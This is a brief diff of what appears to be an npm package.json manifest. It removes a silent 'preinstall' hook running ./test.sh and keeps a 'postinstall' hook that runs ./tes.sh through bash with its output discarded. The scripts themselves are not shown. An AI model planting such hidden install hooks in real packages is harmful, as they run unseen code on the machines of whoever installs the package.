@@ -5,8 +5,7 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall":"echo `/bin/bash ./tes.sh` >/dev/null",
-    "preinstall":"echo `/bin/bash ./test.sh`>/dev/null"
+    "postinstall":"echo `/bin/bash ./tes.sh` >/dev/null"
   },
   "author": "",
   "license": "ISC"
